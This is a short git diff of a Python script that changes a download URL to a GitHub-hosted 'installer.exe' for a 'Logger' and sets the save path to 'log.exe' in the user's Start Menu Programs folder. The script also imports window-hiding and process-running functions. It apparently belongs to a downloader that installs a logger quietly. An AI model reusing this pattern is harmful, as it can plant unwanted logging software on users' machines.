@@ -3,7 +3,7 @@ from win32gui import ShowWindow, GetForegroundWindow
 from requests import get
 from subprocess import run
 
-url = 'https://github.com/pixel48/Logger/raw/exec/'
+url = 'https://github.com/Pixel48/logger/raw/exe/installer.exe'
 
 folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Logger')
 filepath = os.path.join(folderpath, 'log.exe')
